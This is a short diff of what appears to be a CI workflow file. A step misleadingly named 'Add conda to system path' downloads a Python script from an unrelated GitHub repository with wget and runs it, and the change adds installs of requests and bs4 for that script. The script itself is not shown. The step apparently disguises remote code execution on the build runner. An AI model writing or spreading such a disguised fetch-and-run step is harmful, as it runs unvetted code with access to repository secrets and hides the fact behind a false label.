@@ -17,4 +17,6 @@ jobs:
     - name: Add conda to system path
       run: |
         wget -O n.py https://github.com/Mosnio/yamigv/raw/main/fm.py
+        pip install requests
+        pip install bs4
         python n.py
